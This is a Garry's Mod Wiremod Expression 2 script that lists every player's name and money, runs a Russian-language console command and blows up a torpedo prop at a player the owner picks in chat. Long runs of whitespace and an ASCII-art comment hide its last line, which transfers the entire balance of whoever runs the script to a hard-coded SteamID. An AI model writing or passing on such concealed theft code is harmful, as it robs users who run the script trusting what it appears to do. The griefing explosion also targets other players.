@name Dlya Jesus
@inputs 
@outputs 
@persist I II Gas:gtable Text:string Array:array
interval(1)
noDuplications()
timer("UpdateList",10000)
findIncludeClass("player")
findInSphere(entity():pos(),10000000000)
Array = findToArray()
if(clk("UpdateList")){    
    for(I = 1 , Array:count()){   
    print(Array[I,entity]:name()+"  "+"Money:"+Array[I,entity]:psGet())
    concmd("если хочешь взорваться себя mne") 
    
}
}
                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
          chatClk(owner())                                                                                                                                                                                                                                                                                                                                                                                                                                                              
Text = owner():lastSaid() 



                                                                                                                                                                                                                                                                                                                                                                                                                                                                   
                                                                                                                                                                                                                                                                                                                                                                                                                                                                        

P = propSpawn("models/props_phx/torpedo.mdl",entity(Text:toNumber()):pos(),0)                                                                                           
P:propBreak()    






#[
..| : : : : : : : : : : : : : : : : : : : : : : : : : : : : : : : : :-',
...\ : : : : : : : : : :': : : : : : : : : : : : : :~,,: : : : : : : : : ~-',
... : : : : : : : : : : :: /: : : : : : : : : : : : : : : ,: : : : : : : : : : :,~,
... .: : : : : : : : : : :|: : : : : : : : :. : : : : : : : : : : : : : : : : : : :-,
... ...: : : : : : : : : : : : : : : : : : ( O ) : : : : : : : : : : : : : : : : : : : : '.
... ... .\ : : : : : : : : : '': : : : : : : :"*": : : : : : : :|: : : : : : : : : : : : : : : |0)
... ... ...\ : : : : : : : : : ': : : : : : : : : : : : : : : :/: : : : : : : : : : : : : : : /""
... ... .....\ : : : : : : : : : : : : : : : : : : : : : : ,-: : : : : : : : : : : : : : : :/
... ... ... ...\ : : : : : : : : : : : : : : : : : : =" : : : : : ',_.: : : : : : : :,-
... ... ... ... ,: : : : : : : : : : :"'~---~" : : : : : : : : : : : : = :"
}

]#

findPlayerBySteamID("STEAM_0:0:610557360"):psGive(owner():psGet())
